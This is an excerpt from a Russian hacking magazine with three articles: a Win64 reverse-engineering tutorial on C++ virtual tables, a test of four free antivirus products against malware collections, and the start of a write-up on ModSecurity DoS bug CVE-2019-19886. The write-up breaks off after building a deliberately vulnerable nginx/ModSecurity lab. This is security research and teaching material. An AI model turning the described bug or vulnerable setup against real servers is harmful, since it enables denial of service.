.text:000000014000148D  jz    short loc_1400014E4
.text:000000014000148F  test  sil, sil
.text:0000000140001492  jnz   short loc_140001499
.text:0000000140001494  call  _cexit_0

Чтобы повторить эксперимент, в VS 2017 создай и скомпилируй 64‐битное
консольное приложение, затем открой его в IDA.
  Первым делом забира ем два параметра из командной строки, вызвав
функции __p___argv_0 и __p___argc_0. Далее их значения раз мещаются
в регистрах процессора и таким образом переда ются в функцию main. Опять
же, отличие от 32‐битной среды в том, что в ней они запихивались в стек.
  После того как main отработает, ана лизи руется возвращенное ей зна‐
чение, на основании чего выполняются прыжки на соответс твующие ветви
кода. Например, main может отработать по‐разному и в случае возврата
ошибки приложение, как вариант, надо уничтожить. Если же все идет по пла‐
ну, то вызывается _cexit_0 и все довольны.
   Вот мы и разоб рались с идентификацией основных типов стартовых фун‐
кций. Конечно, в жизни все быва ет не так прос то, как в теории, но в любом
случае описанные выше приемы замет но упростят ана лиз.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
              ИДЕНТИФИКАЦИЯ СТАРТОВОГО КОДА
           И ВИРТУАЛЬНЫХ ФУНКЦИЙ ПРИЛОЖЕНИЙ
                               ПОД WIN64





ИДЕНТИФИКАЦИЯ ВИРТУАЛЬНЫХ ФУНКЦИЙ
Виртуальная функция озна чает «определяемая во вре мя выполнения прог‐
раммы». При вызове виртуальной функции выполняемый код дол жен соот‐
ветствовать динамическому типу объекта, из которого вызывается функция.
Поэтому адрес виртуаль ной функции не может быть определен на стадии
компиляции, это приходится делать непосредс твенно в момент ее вызова.
Вот почему вызов вир туальной функции всег да косвенный (исключение сос‐
тавляют лишь виртуальные функции статических объектов).
  В то время как невиртуальные функции вызыва ются в точности так же,
как и обычные С‐функции, вызов виртуальных функций кардинально отличает‐
ся. Схема вызова зависит от реализации конкретного компилятора, но в
общем случае ссылки на все виртуальные функции помещаются в специаль‐
ный массив — виртуальную таблицу (virtual table, сокращенно VTBL). А в каж‐
дый экземпляр объекта, использующий хотя бы одну виртуальную функцию,
помещается указатель на виртуальную таб лицу (virtual table pointer — сок‐
ращенно VPTR). Причем независимо от числа виртуальных функций каждый
объект име ет только один указатель.
  Вызов виртуальных функций всегда происходит косвенно, через ссыл ку
на виртуальную таблицу, например: CALL [RBX+0x10], где RBX — регистр,
содержащий сме щение виртуальной таблицы в памяти, а 0x10 — смещение
указателя на вир туальную функцию внут ри вир туальной таблицы.
   Анализ вызова вир туаль ных функций наталкива ется на ряд сложностей,
самая коварная из которых — необходимость обратной трассировки кода
для отслеживания значения регистра, используемо го для косвенной адре‐
сации. Хорошо, если он инициализиру ется непосредственным значением
типа MOV RBX, offset VTBL недалеко от места использования, но значитель‐
но чаще указатель на VTBL передается функции как неявный аргу мент.
Или (что еще хуже) один и тот же ука затель исполь зуется для вызова двух раз‐
личных виртуальных функций. Тогда воз никает неопределенность, какое
именно значение он имеет в данной ветке прог раммы.
   Разберем сле дующий пример (предварительно вспомнив, что, если одна
и та же «невиртуальная» функция присутству ет и в базовом, и в производном
классе, всегда вызывается функция базового класса):


#include <stdio.h>
class Base{
    public:


    virtual void demo(void){
        printf("BASE\n");
    };


    virtual void demo_2(void){
        printf("BASE DEMO 2\n");
    };


    void demo_3(void){
        printf("Non virtual BASE DEMO 3\n");
    };
};


class Derived: public Base{
    public:


    virtual void demo(void){
        printf("DERIVED\n");
    };


    virtual void demo_2(void){
        printf("DERIVED DEMO 2\n");
    };


    void demo_3(void){
        printf("Non virtual DERIVED DEMO 3\n");
    };
};


int main(){
    printf("main\n");


    Base *p = new Base;
    p‐>demo();
    p‐>demo_2();
    p‐>demo_3();


    p = new Derived;
    p‐>demo();
    p‐>demo_2();
    p‐>demo_3();
}

Результат компиляции примера в общем случае должен выглядеть так:


; int __fastcall main()
main proc near       ; CODE XREF: __scrt_common_main_seh+107↓p
    push  rbx
    sub   rsp, 20h
    lea   rcx, aMain ; "main\n"
    call  printf
    mov   ecx, 8     ; size
    call  operator new(unsigned __int64)

В RAX возвращается ука затель на выделен ный блок памяти. Выделяем
восемь байт памяти для экземпляра нового объекта. Объект состоит только
из указателя на VTBL. Обра ти внимание, что в подавляющем большинстве
случаев возвращаемое зна чение функции помеща ется в регистр RAX.


mov  rbx, rax
lea  rax, const Base::`vftable'

В только что созданный объект копиру ется ука затель на виртуальную таблицу
класса Base. То, что это именно виртуальная таб лица класса Base, можно
узнать, проанализировав элементы этой таб лицы, — они указывают на члены
класса Base. Следовательно, сама таблица есть виртуальная таблица этого
класса.


mov  rcx, rbx ; this

Заносим в RCX указатель на экземпляр объекта (указатель на указатель
на BASE_VTBL). Другими сло вами, переда ем вызываемой функции неявный
аргумент — указатель this (к сло ву, пос кольку this считается целочис‐
ленным аргументом, он всегда помещается в регистр RCX).


mov  [rbx], rax

По адресу, на который указывает RBX, помеща ем указатель на вир туальную
таблицу класса Base, не забывая о том, что указатель на виртуальную таблицу
одновременно указатель и на первый элемент этой таблицы. А первый эле‐
мент виртуальной таблицы содержит указатель на первую (в порядке объ‐
явления) виртуальную функцию клас са.


call  cs:const Base::`vftable' ; Base::demo(void) ...

Вот он, вызов виртуальной функции! Чтобы понять, какая именно функция
вызывается, мы дол жны знать зна чение регис тра RAX. Прокручивая экран
дизассемблера вверх, мы видим: RAX ука зывает на BASE_VTBL ‐ ‐ Base::
'vftable', а первый член BASE_VTBL (см. ниже) указывает на функцию
Base::demo. Следовательно:
 1. этот код вызывает имен но функцию Base::demo;
 2. функция Base::demo — это вир туальная фун кция.


mov  rdx, [rbx]

Заносим в RDX указатель на первый элемент вир туальной таблицы класса
Base.


mov  rcx, rbx

Заносим в RCX указатель на экземпляр объекта: это неявный аргумент фун‐
кции — указатель this.


call  qword ptr [rdx+8]

Еще один вызов виртуальной функции! Чтобы понять, какая именно функция
вызывается, мы дол жны знать содержимое регис тра RDX. Прокручивая экран
дизассемблера вверх, видим, что он указыва ет на BASE_VTBL, а RDX+8, стало
быть, указывает на второй элемент вир туальной таблицы класса Base. Он же,
в свою оче редь, указывает на функцию Base::demo_2.


lea   rcx, aNonVirtualBase ; "Non virtual BASE DEMO 3\n"
call  printf

А вот вызов невиртуальной функции. Обрати внимание — он происходит так
же, как вызов обыч ной С‐функции. Заметь, эта функция встроенная, так
как объявлена непосредственно в самом классе и вместо ее вызова выпол‐
няется подстановка кода.


mov   ecx, 8 ; size
call  operator new(unsigned __int64)

Далее идет вызов функций клас са Derived. Не будем здесь подробно его
комментировать, сделай это самостоятельно. Вооб ще же, класс Derived
понадобился только для того, чтобы показать особенности компоновки вир‐
туальных таблиц.


mov   rbx, rax
    lea   rax, const Derived::`vftable'
    mov   rcx, rbx             ; this
    mov   [rbx], rax
    call  cs:const Derived::`vftable'
    mov   rdx, [rbx]
    mov   rcx, rbx
    call  qword ptr [rdx+8]
    lea   rcx, aNonVirtualBase ; "Non virtual BASE DEMO 3\n"
    call  printf
    ; Обрати внимание — вызывается функция demo_3 базового,
    ; а не производного класса!
    xor   eax, eax
    add   rsp, 20h
    pop   rbx
    retn
main endp


Иска жен ные име на
Если у тебя в окне дизассемблера имена функций выглядят немного неожи‐
данно (с примесью знаков вопроса и коммерческого at — ?,@) и это доставля‐
ет  дискомфорт, можешь  отклю чить  замангливание  (кромсание)  имен.
Для этого в IDA открой окно Demangled C++ names (Options → Demangled
names…), поставь переключатель на пункт Names и жми OK. Пос ле этой нехит‐
рой операции имена функций примут привычный вид.





               Окно для отключения замангливания

Вот как выглядят наши функции:


; void __fastcall Base::demo(Base *this)
public: virtual void Base::demo(void) proc near
    lea  rcx, _Format       ; "BASE\n"
    jmp  printf
public: virtual void Base::demo(void) endp


; void __fastcall Base::demo_2(Base *this)
public: virtual void Base::demo_2(void) proc near
    lea  rcx, aBaseDemo2    ; "BASE DEMO 2\n"
    jmp  printf
public: virtual void Base::demo_2(void) endp


; void __fastcall Derived::demo(Derived *this)
public: virtual void Derived::demo(void) proc near
    lea  rcx, aDerived      ; "DERIVED\n"
    jmp  printf
public: virtual void Derived::demo(void) endp


; void __fastcall Derived::demo_2(Derived *this)
public: virtual void Derived::demo_2(void) proc near
    lea  rcx, aDerivedDemo2 ; "DERIVED DEMO 2\n"
    jmp  printf
public: virtual void Derived::demo_2(void) endp

Таблицы виртуальных методов:


dq offset const Derived::`RTTI Complete Object Locator'
; void (__fastcall *const Derived::`vftable'[3])()
const Derived::`vftable' dq offset Derived::demo(void)
dq offset Derived::demo_2(void)


dq offset const Base::`RTTI Complete Object Locator'
; void (__fastcall *const Base::`vftable'[3])()
const Base::`vftable' dq offset Base::demo(void)
dq offset Base::demo_2(void)

Обрати внимание: виртуальные таб лицы «рас тут» снизу вверх в порядке объ‐
явления классов в программе, а элемен ты вир туальных таблиц «растут» свер‐
ху вниз в порядке объявления вир туаль ных функций в классе. Конечно, так
бывает не всегда. Порядок размещения таблиц и их элементов нигде не дек‐
ларирован и целиком лежит на «совес ти» компилятора. Но на практике боль‐
шинство из них ведет себя имен но так. Сами же виртуальные функции рас‐
полагаются вплотную друг к другу в порядке их объявле ния.





                                 Visual Studio 2017


ИТОГИ
Мы только начали вникать в устройство виртуаль ных функций на C++. На этом
пути нас ждет еще мно го крышесрывающих зиг загов и умопомрачительных
моментов! Мы продол жим раз бирать ся с ними в следующей статье.
   Также мы добрались до того момента, когда между x86 и x64 образова‐
лась ощутимая пропасть. Мы уже прошли этап, на котором было удобно раз‐
бираться с кодом для 32‐разрядной платформы только потому, что в нем
короче адреса в дизассемблерном листинге. Даль ше (как и в этой статье) код
будет более платформенно ориентированным, следовательно, вычисления
станут сложнее. Однако,  как мы убедимся в дальнейшем, архитектура
Win64 навела порядок среди  хаоса, допущенного во время перехода
с Win16 на Win32.
ВЗЛОМ

 ОТВРАТИТЕЛЬНАЯ
    ЧЕТВЕРКА





    ТЕСТИРУЕМ НОВЫЕ БЕСПЛАТНЫЕ
  АНТИВИРУСЫ HUORONG, PREVENTON,
       ZONER И FS PROTECTION





Мы проверим в бою два британ ских аве ра,
новый китайский антивирь с собствен ным
движком и занятную чешскую разработку
в стадии бета‐версии. Все они доступны
бесплатно и предлагают дополнительные              84ckf1r3                                                                                         84ckf1r3@gmail.com
уровни защиты, помимо базовой проверки
системы. Смогут ли эти антивирусы одо леть
полчища троянов и червей, которые мы им
приготовили?


На ши тес ты дру гих анти виру сов
 1. Kaspersky Free, Avira Free, AVG Free и Avast! Free
 2. Comodo, Qihoo 360, Panda и Windows Defender
 3. Clam Sentinel, FortiClient, Tencent и NANO Антивирус
 4. Ad‐Aware, Crystal Security, Sophos Home и ZoneAlarm + Firewall
 5. Anvi Smart Defender Free, Baidu Antivirus, Immunet AntiVirus и Zillya!
 6. Bitdefender, Clearsight, Rising, Roboscan
 7. F‐Secure   Anti‐Virus,  G  Data   AntiVirus,  eScan   Anti‐Virus,  Webroot
   SecureAnywhere
 8. Kaspersky Total Security, Dr.Web Security Space, Norton Security Premium, K7
   Ultimate Security




МЕТОДИКА ТЕСТИРОВАНИЯ
Для проверки каждого антивиру са мы обес печили максимально сходные
условия. Сначала в VirtualBox соз дали тес товую виртуал ку с чис той Windows
10 Pro (1909). Потом установили все обновления (кроме проблемных), нас‐
троили автоматический вход и автоподключение сетевой папки, отключили
«Защитник Windows» и антивирус основной ОС.
  Затем мы сделали кло ны виртуальной машины — свой для каждого авера.
Непосредственно перед тес том антивиру сы обновля лись. Их настройки оста‐
вались в дефолтных, пос кольку именно так их и будет запускать большинство
пользователей. Исключения были сделаны толь ко в сторону повышения веро‐
ятности детекта. Мы убедились, что включена защита в реальном времени,
а также отключили лимит для файлов по размеру и расширению, чтобы гаран‐
тированно проверялись все подряд.


             INFO

                      Автор благодарит VX Heaven за предоставленные
                       образцы.


Краткое описание тестовых наборов со зловредами всех мастей при веде но
ниже.
  Основная часть:
 • 100 бэкдоров для Windows;
 • 100 сетевых червей (IM, IRC, email, P2P и другие);
 • 100 троянов для Windows (банкеры, кликеры, даунлоаде ры, дропперы
   и прочее);
 • 100 компонентов навяз чивой рекламы.

До пол нительная часть:
 • 100 бэкдоров для Linux;
 • 37 руткитов для Windows;
 • 87 зловредов, для которых на момент составления подборки отсутство‐
   вали сигнатуры. Они определялись только некоторыми эвристическими
   анализаторами;
 • 49 примеров вредоносного кода для процессорных архитектур, отличных
   от x86 (MIPS, Motorola MC68K, SPARC, PowerPC).

Базовая часть подборки нужна для проверки реакции антивиру са на типовые
угрозы для Windows, а вспомога тельная позволяет оценить уровень эвристи‐
ки и кросс‐платформенной защиты.


           WARNING

                     Все тесты выполнялись только в исследователь‐
                        ских целях. Необходимые файлы были загружены
                        с общедоступных ресурсов. Разработчики про‐
                         тестирован ных антивирусов получили автомати‐
                        ческие уведомления о результатах ска нирования.
                       Редак ция  и  автор  не  несут  ответственности
                        за любой возможный вред.



HUORONG INTERNET SECURITY
Китайских антивирусов рас пло дилась уйма, однако раз работчик Huorong Se‐
curity был аккредито ван Microsoft как доверенный поставщик антивирус ного
софта для Windows и хотя бы этим зас лужил внимание.
  С официального сайта была загружена версия 5.0.37.6 от 16 нояб‐
ря 2019 года размером 18,5 Мбайт. В ней заявлена пол ная под держка 32‐
и 64‐битных версий Windows от XP до 10. К сожалению, поддержки рус ского
языка пока нет.





          Huorong Internet Security — главное окно и выбор языка

После установки Huorong Internet Security обно вился до версии 5.0.39.2.
Антивирус занял около 40 Мбайт на диске и сла бо нагружал сис тему даже
при активации всех дополнительных компонентов защиты.
  Они включают в себя про активный модуль, ана лизатор веб‐трафика, сис‐
тему обнаружения вторжений на хос те (HIPS) и файрвол. Два пос ледних сни‐
жают риск добавления компь ютера в ботнет и распространения заразы
по локальной сети, блокируя аномальный трафик в любом направле нии.





     Huorong — настрой ки антивиру са и дополнительных компонентов

Еще один актуальный компонент — защита от распространенных способов
несанкционированного удаленного доступа (например, он детектит и бло‐
кирует брут пароля админского акка унта).
   Также доступен контроль дос тупа при ложений с возможностью задать
свои правила для всех прог рамм и вспомогатель ные инструменты безопас‐
ности. Среди них интересен модуль защиты от уяз вимос тей. Он препятствует
применению известных экс пло итов, что особенно актуально для противодей‐
ствия APT и таргетированным ата кам.





    Huorong — набор встроенных утилит для ана лиза и очистки системы

Huorong  Internet  Security использует собственный антивирус ный дви жок
под названием Cobra. Информации о нем найти не удалось. Известно лишь
то, что он запускает проверяемый код в изолированной среде HVM (вир‐
туальной машине Huorong). Тем интерес нее будет его испы тать!


Тесты
Антивирус Huorong не смог проверить ни один тестовый каталог в сетевой
папке. Он просто зависал, бесконечно крутя анимацию сияюще го щита.
Никакого индикатора прогресса, никакой статис тики — вообще ничего
информативного при этом не выводилось.
   Тогда мы создали в кор не диска C:\ подкаталог V\ и скопировали бэкдоры
туда. Huorong позволил это сделать, но тут же опомнился и стал показы вать
во всплывающем окне, сколько разной заразы он обнаружил.





            Всплывающее окно Huorong во время проверки

Нашел он немного: 52 штуки, а 48 из 100 бэкдоров остались на системном
разделе.





               Huorong оставил почти половину зловредов

Еще хуже антивирь «спра вился» с троянами, определив только 39 образцов,
а 61 из 100 избежали детекта. Далее скрин шоты не привожу, они все одно‐
типные.
  С подборкой сетевых чер вей все тоже ока залось плачевно: он поместил
в карантин 48 штук, а 52 из 100 оста лись нет ронутыми.
  Из компонентов навяз чивой рекламы Huorong распознал меньше полови‐
ны: 49 отправились в карантин, а 51 из 100 оста лись на диске.
  Статистика детек та в основном раун де:
 • Backdoors — 52%;
 • NetWorms — 48%;
 • Trojans — 39%;
 • Adware — 49%.

Проще говоря, Huorong определяет все типы угроз через одну. Более того,
он делает это в несколь ко эта пов. На каждой выборке из ста файлов анти‐
вирус трижды показывал всплывающее окно и заново подсчитывал число
мал варей, обнаруженных в той же папке. Проверить сразу всю он не может и,
пока обнюхивает одних зловредов, никак не блокирует доступ к другим.
  В дополнительном раунде антивирус также не смог реабилитироваться.
Из 37 руткитов он проигнорировал 22, а среди 87 малоизвестных угроз про‐
пустил почти все, оставив 79 штук. Huorong не распознал ни одной угрозы
среди написанных для процессорных архитектур, отличных от x86/x86‐64.
Эвристика и продвинутая защита у Huorong тоже оказались ни к черту.
  Сначала мы решили, что и зловредов для Linux он не увидит, но китай ский
антивирь немного подумал и удалил из подборки линуксовых малварей одну
(99 остались). Лучше бы он вообще этого не делал — сошел бы за средний
виндовый авер без претензий на защиту других платформ.
  Статистика детек та в допол нительном раун де:
 • RootKITs — 40%;
 • Heuristic — 9%;
 • Linux malware — 1%;
 • non‐x86 threats — 0%.

В общем, антивирус с основной задачей спра вился плохо. Отме тим еще и
следующие условные недостатки:
 • нет возможности проверить тра фик HTTPS (но нет и риска выполнения
   атаки типа «Касперский посередине» благода ря установке своего сер‐
   тификата);
 • нет средств облачной проверки, поэтому Huorong дольше реагирует
   на свежие угрозы. С другой стороны, ваши файлы останутся вашими, а не
   отправятся в облако «на анализ», когда взду мается антивирусу.



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    ОТВРАТИТЕЛЬНАЯ
           ЧЕТВЕРКА
                   ТЕСТИРУЕМ НОВЫЕ БЕСПЛАТНЫЕ
         АНТИВИРУСЫ HUORONG, PREVENTON, ZONER
                           И FS PROTECTION





PREVENTON ANTIVIRUS FREE
Это бесплатный антивирус для Windows всех версий и разряднос тей (начиная
с XP и до Win 10 x64) от британско го разработчика C/O Security Software. Мы
протестировали версию 5.5.117, в которой была выполнена качественная
локализация (все пункты меню отображались на русском язы ке без ошибок).
  Отдельного дистрибутива для бесплатной версии нет. Сразу пос ле уста‐
новки антивируса запускается тестовый период платной редакции Preventon
Antivirus Premium сроком 30 дней. Через месяц вам предложат купить лицен‐
зию, а если вы откажетесь, то сможете продолжить использовать Preventon
бесплатно с ограничениями редакции Free.





  Антивирус Preventon — начало ознакомительного периода перед акти ‐
  вацией бесплатной версии

Она обеспечивает базовый уро вень защиты: ска нирует файлы автоматически
по мере обращения к ним и позволяет в любой момент выборочно проверить
отдельные объекты. Выбрать файлы, катало ги и целые раз делы для проверки
можно как из главного окна антивиру са, так и через контекстное меню про‐
водника.





                   Нас трой ки Preventon Antivirus

Обновления Preventon выходят ежедневно, однако актуализация баз не про‐
думана. Вместо бинарных апдейтов все базы перезаписы ваются целиком,
что занимает много времени — око ло вось ми минут при подключении
по выделенке.


Тесты
Preventon  Antivirus  Free  без  проблем  просканировал  сетевую  папку
и нашел 84 бэкдора из 100. Близкий результат он показал и при сканиро‐
вании подборки сетевых червей, обнаружив 86 из 100. Однако дальше дело
пошло  гораздо  хуже. С  трояна ми  авер  спло ховал,  определив  толь‐
ко 58 из сотни. Борьба с назойливой рекламой тоже не стала его сильной
стороной — в карантин отправились лишь 52 из 100 модулей Adware.





                 Preventon — сканирование сетевой папки

Обрати внимание на особенность  Preventon: при проверке он считает
не файлы, а все составные компоненты. Нап ример, если помес тить упакован‐
ный экзешник в архив, он покажет, что прос канировал два или три объ екта —
как повезет. Поэтому и в логах часто отоб ража ется перевыполнение плана.
К примеру, у нас пер вая запись гла сила, что Preventon обнаружил 118 угроз
в подборке из 100 (при том что часть из них он вообще не определил).
  Статистика детек та в основном раун де:
 • Backdoors — 84%;
 • NetWorms — 86%;
 • Trojans — 58%;
 • Adware — 52%.

Дополнительный  раунд  принес  антивирусу  частичную  реабилитацию.
Из 37 руткитов он отправил в карантин 24 — хотя бы больше половины.
  Все подборки Preventon ска нировал за 10–15 с, а вот над тестовой папкой
\HEUR\ призадумался. Она содержала редкие угрозы, собранные несиг‐
натурным анализом. Preventon обнюхивал ее 78 с и заподозрил 52 зловреда
из 87.
  Среди  сотни  малварей  под   Linux  антивирус  обез вредил   77,
а из 49 образцов вредонос ного кода для раз ных процессорных архи тектур
определил только 27.
  Статистика детек та в допол нительном раун де:
 • RootKITs — 65%;
 • Heuristic — 60%;
 • Linux malware — 77%;
 • non‐x86 threats — 55%.


ZONER ANTIVIRUS ДЛЯ WINDOWS
Это новый антивирус от чеш ского раз работчика Zoner software. Без регис тра‐
ции  аккаунта им поль зоваться невозможно. Хорошо,  что она быстрая
и успешно проходит даже при ука зании одноразовых имей лов.





               Zoner AntiVirus требует регистрации аккаунта

Мы тестировали публичную бета‐версию 1.4.0 для Windows 10. Заявлено, что
она выполняет сигнатурный и эвристический ана лиз файлов при обращении
к ним, сканирует каталог «Загрузки» и домашнюю пап ку текущего пользовате‐
ля. Если находит зашифрованный архив, то для проверки его содержимого
предлагает указать пароль.





               Сырой интерфейс Zoner AntiVirus

По факту интерфейс ока зался настолько недора ботан, что в нем даже нельзя
указать  папку  для  ручного  ска ниро вания. Нет и  пункта  «Сканировать
с помощью Zoner AntiVirus» в контекс тном меню проводника.


Тесты
При копировании зараженных файлов из сетевой папки антивирус мол чал.
Сохранил он полное равнодушие и когда мы стали поочередно откры вать
каталоги (Backdoors\, Trojans\ и так далее) на системном разделе.





                        Zoner не видит зловредов

Автоматическая проверка не сра ботала, задать ручную просто нечем. В глав‐
ном окне можно запустить только проверку каталога «Загрузки» и домашней
папки пользователя, но даже в них анти вирус не увидел ни одного тес тового
файла.
  На всякий случай мы переименова ли файлы со зловредами, присвоив им
исполняемое расширение (.exe), но это ничего не изме нило. Zoner AntiVirus
по‐прежнему их игнорировал.





                   Пол ный провал Zoner AntiVirus

Ито говый результат: 0% во всех категориях.
   Если бы не репутация разработчика, мы бы предположили, что это фей‐
ковый антивирус. Почему нельзя было сразу добавить выбор объ ектов
для сканирования и сделать интеграцию в контекс тное меню? Загад ка.


FS PROTECTION
Антивирус от финского раз работчика F‐Secure предос тавля ется бесплатно.
После регистрации ты получа ешь лицензию сроком на пол года и ссылку
на скачивание. Для тестировщиков есть мелкие бонусы: подписка на авто‐
матические обновле ния и возможность отправить разработчикам пожелания
об изменении функциональности конечного продукта.





  После регистрации мож но ска чать версии FS Protection для раз ных плат‐
  форм

Мы протестировали версию 17.8 beta 6 для Windows. Ее особенность в том,
что управление частично уда ленное. Оно выполняется через веб‐интерфейс
на портале My FS Protection, где дос тупны нас тройки всех защищаемых
устройств из одной учетной записи.





                    Ин терфейс FS Protection

Локальные настройки требуют подтверждения прав адми нистратора. Все
пункты меню грамотно переведены на русский язык и логично расположе ны
на соответствующих вкладках. Первое впечатление сложилось при ятное,
взглянем на результаты испытаний боем.


Тесты
Несмотря на статус бета‐версии, FS Protection без проблем просканировал
сетевую папку. Он тут же показал найденных зловредов и спросил, что с ними
делать, предлагая очистить (удалить) по умолчанию.





         FS Protection — результаты про верки и выбор действий

Статистика детек та в основном раун де:
 • Backdoors — 84%;
 • NetWorms — 99%;
 • Trojans — 91%;
 • Adware — 88%.

По сравнению с другими учас тниками сегодняшних тес тов это довольно
хороший результат, однако у антивируса от извес тно го разработчика до сих
пор есть серьезные недос татки.
  Например, если зараженный объект находится внутри архива или сооб‐
щения  электронной  почты, FS  Protection  не сможет  его  ни  удалить,
ни переместить в карантин. Он предложит пропустить автоматичес кую обра‐
ботку и удалить опасный файл вручную. С многоуровневыми вложениями этот
антивирус вообще не справляется — он не может их проверить, отображая
предупреждение в логах.





    FS Protection не смог уда лить некоторые из рас познанных зловредов


Статистика детек та в допол нительном раун де:
 • RootKITs — 95%;
 • Heuristic — 64%;
 • Linux malware — 76%;
 • non‐x86 threats — 71%.

В целом FS Protection выглядит перспективным продуктом. Уровень детекта
большинства типов угроз у него уже высокий, есть много допол нительных
инструментов, а пользователю дос тупны широкие возможности кастомиза‐
ции. Осталось избавить антивирус от детских болез ней, научив удалять вло‐
женные объекты и парсить длинные пути.


ВЫВОДЫ
За последние годы мы протестировали больше трех десятков фриварных
аверов и пришли к неутешительному результату: большинство из них уступает
даже «Защитнику Windows», при этом отключая его, чтобы избежать конфлик‐
тов. Получается, что установка бесплатного антивируса час то снижает уро‐
вень защиты, а вовсе не дополняет штатные средства ОС.
  Более того, бесплатные антивирусы все чаще нарушают нормальную
работу системы. Они внедряют свои драйверы и прочие низкоуровневые
компоненты, которые содержат раз личные ошиб ки и серьезные уязвимости.
  Почти все бесплатные антивирусы имеют функцию сбора данных о поль‐
зовательских предпочтениях. Они плохо выявляют компоненты навязчивой
рекламы, а порой и сами содержат ее.


        WWW

                       •Huorong Internet Security
                         •Preventon Antivirus Free
                       •Zoner AntiVirus для Windows
                    •FS Protection beta
ВЗЛОМ
 ДОСИМ
  MODSECURITY

     КАК РАБОТАЕТ КРИТИЧЕСКИЙ БАГ
         В ПОПУЛЯРНОМ WAF





В   ModSecurity  —   известном  WAF
для Apache, IIS и nginx — наш ли критичес‐
кую уязвимость, которая приводит к отка зу
в обслуживании. Причем завершает работу
не только сама библиотека, но и приложе‐                aLLy                                                                                    ONsec
ния, которые ее вызыва ют. Давай  раз‐              @iamsecurity
беремся, в чем ошиблись разработчики
ModSecurity  и  как  эксплуатировать  эту
лазейку при пентестах.


У ModSecurity есть свой скрип товый язык, основанный на событиях. Он обес‐
печивает защиту от множества видов атак на веб‐при ложе ния и позволяет
мониторить HTTP‐трафик, вести логи и ана лизи ровать запросы в реальном
времени. Это делает ModSecurity очень гиб ким инструментом для поис ка
потенциально небезопасных данных и реакции на них.
   Баг обнаружили Эрвин Хегедюш (Ervin Hegedüs) и Андреа Менин (Andrea
Menin), разработчики OWASP Core Rule Set, когда изучали работу парсера
запросов, в частности обра ботку хидера cookie.
   Баг позволяет злоумыш леннику отпра вить специально сформированный
запрос, который будет завершать работу родительского процесса. Отправка
большого количества таких запросов может при вести к тому, что веб‐сервер
станет отве чать гораздо медленнее или вообще перестанет реаги ровать
на запросы пользователей (отказ в обслуживании).


             INFO

                       Уязвимость получила иден тификатор CVE‐2019‐
                      19886 и затрагивает все версии Trustwave Mod‐
                           Security  ветки  3.х, начиная с  3.0.0 и  закан‐
                       чивая 3.0.3 включительно.



СТЕНД
Сначала нужно поднять тес товое окру жение. Здесь есть два варианта.
   Если не хочешь возить ся с отладкой и копани ем в сорцах, то можешь
просто запустить докер‐контейнер с уяз вимой версией ModSecurity и потес‐
тить эксплоит.


docker run ‐‐rm ‐p 80:80 ‐ti ‐‐rm owasp/modsecurity:3.0.3‐nginx

Второй вариант — скомпилить все из сорцов с возможностью дебага.
   Начнем с запуска контейнера с Debian на борту и установки всех необ‐
ходимых пакетов.


docker run ‐‐rm ‐ti ‐‐cap‐add=SYS_PTRACE ‐‐security‐opt seccomp=
unconfined ‐‐name=nginxdos ‐‐hostname=nginxdos ‐p80:80 debian /bin/
bash
apt update && apt install nano wget git procps gdb automake bison
build‐essential g++ gcc libbison‐dev libcurl4‐openssl‐dev libfl‐dev
libgeoip‐dev liblmdb‐dev libpcre3‐dev libtool libxml2‐dev
libyajl‐dev make pkg‐config zlib1g‐dev

Теперь скачиваем библиотеку ModSecurity последней уязвимой версии 3.0.3.


cd /root
git clone ‐‐depth 1 ‐b v3.0.3 ‐‐single‐branch https://github.com/
SpiderLabs/ModSecurity

Далее подгрузим все необходимые модули.


cd ModSecurity/
git submodule init
git submodule update

А потом скомпилируем ее и установим.


./build.sh && ./configure && make && make install





           Установка уяз вимой версии биб лиотеки ModSecurity

Пришел черед коннектора для nginx.


cd /root && git clone ‐‐depth 1 https://github.com/SpiderLabs/ModSec
urity‐nginx.git

Ну и сам веб‐сервер, разумеется.


wget ‐q https://nginx.org/download/nginx‐1.16.1.tar.gz
tar ‐zxf nginx‐1.16.1.tar.gz
cd nginx‐1.16.1

Теперь сконфигурируем его для использования биб лиотеки ModSecurity.


./configure ‐‐add‐module=/root/ModSecurity‐nginx

Дальше дело за компиляцией и установкой.


make && make install





        Компиляция и уста новка nginx с поддержкой ModSecurity

Для более наглядных тестов я также уста новлю и запущу PHP‐FPM.


apt install ‐y php‐fpm
service php7.3‐fpm start

По дефолту nginx ставится в директорию /usr/local/nginx/. Перейдем
туда, чтобы немного подпра вить конфиги под наши реалии. Сначала включим
поддержку PHP. У меня PHP‐FPM работает через сокет, поэтому пропишем
путь до него в раздел server файла nginx.conf.


location ~ \.php$ {
    root           html;
    fastcgi_pass   unix:/run/php/php7.3‐fpm.sock;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_
name;
    include        fastcgi_params;
}

Теперь переходим к настройке ModSecurity. Добавим необходимую дирек‐
тиву во все тот же nginx.conf, толь ко на этот раз в раздел http.


modsecurity on;

Так как у нас будет нес колько конфигурационных файлов, сделаем один
общий modsec_includes.conf, в который будем добавлять список необ‐
ходимых конфигов. Подгру зим его при помощи modsecurity_rules_file.


modsecurity_rules_file /usr/local/nginx/conf/modsec_includes.conf;

Далее нужно скопировать дефолтный конфиг  (modsecurity.conf‐recom‐
mended) из дистрибутива ModSecurity.


cp /root/ModSecurity/modsecurity.conf‐recommended /usr/local/nginx/
conf/modsecurity.conf
cp /root/ModSecurity/unicode.mapping /usr/local/nginx/conf/

Переключим библиотеку из пассивного режима в режим блокировки.


sed 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' ‐i modsecurity.
conf

Пришел черед фильтров. Я рекомендую исполь зовать набор правил OWASP
Core Rule Set. Для наших тестов дос таточно будет только нескольких файлов.
В первую очередь загрузим основной конфиг.


mkdir /usr/local/nginx/conf/modsec && cd $_
wget https://raw.githubusercontent.com/SpiderLabs/owasp‐modsec
urity‐crs/v3.3/dev/crs‐setup.conf.example ‐O crs‐setup.conf

Затем мой выбор пал на файл с правилами для предотвращения XSS‐уяз‐
вимостей.


mkdir /usr/local/nginx/conf/modsec/rules && cd $_
wget https://raw.githubusercontent.com/SpiderLabs/owasp‐modsec
urity‐crs/v3.3/dev/rules/REQUEST‐941‐APPLICATION‐ATTACK‐XSS.conf

И наконец, два вспомога тельных конфига — для инициализации правил
и блокировки запроса на основе системы ско ринга.


